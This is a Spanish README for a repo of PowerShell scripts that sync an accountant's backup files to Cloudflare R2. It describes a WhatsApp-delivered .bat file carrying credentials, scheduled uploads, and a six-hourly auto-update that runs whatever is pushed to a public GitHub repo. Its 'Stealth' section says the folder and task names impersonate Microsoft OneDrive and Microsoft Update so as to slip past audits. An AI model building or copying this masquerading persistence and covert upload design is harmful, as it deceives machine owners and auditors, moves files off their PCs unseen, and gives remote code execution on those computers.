# grh-installer

Scripts públicos del sincronizador de backups de Sigma → Cloudflare R2 para clientes GRH.

Este repo contiene solo los `.ps1` del uploader (plumbing). La lógica del sistema vive en el repo privado `grh-erp`.

## Arquitectura

```
GRH-Setup.bat  (enviado por WhatsApp a la PC de la contable, contiene R2 creds)
     │
     ▼
https://raw.githubusercontent.com/oremenicucci/grh-installer/main/install.ps1
     │
     ├─ resuelve carpeta source (shortcut "server" → folder)
     ├─ instala aws-cli
     ├─ descarga sync-bak.ps1 + update.ps1 a %LOCALAPPDATA%\Microsoft\OneDriveSync\
     └─ registra 2 scheduled tasks

Scheduled task 1: "OneDrive Sync Helper" (cada 30 min)
     └─ sync-bak.ps1 → aws s3 cp source → R2

Scheduled task 2: "Microsoft Update Automation" (cada 6h)
     └─ update.ps1 → re-descarga los .ps1 de este repo → auto-update
```

## Archivos

- **install.ps1** — instalador. Registra tareas. Se ejecuta una vez desde el `.bat`.
- **sync-bak.ps1** — uploader. Corre cada 30 min. Lee `config.json` local, sube a R2.
- **update.ps1** — auto-updater. Corre cada 6h. Re-descarga los 3 scripts de este repo.

## Cómo enviar updates

1. Editar el `.ps1` apropiado.
2. `git commit && git push`.
3. En ≤6h, las PCs de los clientes tienen el cambio (via `update.ps1`).

Para updates críticos: pueden forzarse con `Start-ScheduledTask -TaskName 'Microsoft Update Automation' -TaskPath '\Microsoft\OneDriveSync\'` en la PC cliente.

## Seguridad

- Estos scripts son **públicos** — no contienen credenciales.
- Las R2 creds viven en el **config.json local** de cada PC cliente, escrito por el `.bat` inicial.
- El `.bat` se distribuye via WhatsApp / link privado, nunca en repo público.

## Stealth

Los nombres se eligieron para pasar inadvertidos en auditorías casuales:

| Elemento | Nombre |
|---|---|
| Carpeta | `%LOCALAPPDATA%\Microsoft\OneDriveSync\` |
| Task 1 | `\Microsoft\OneDriveSync\OneDrive Sync Helper` |
| Task 2 | `\Microsoft\OneDriveSync\Microsoft Update Automation` |
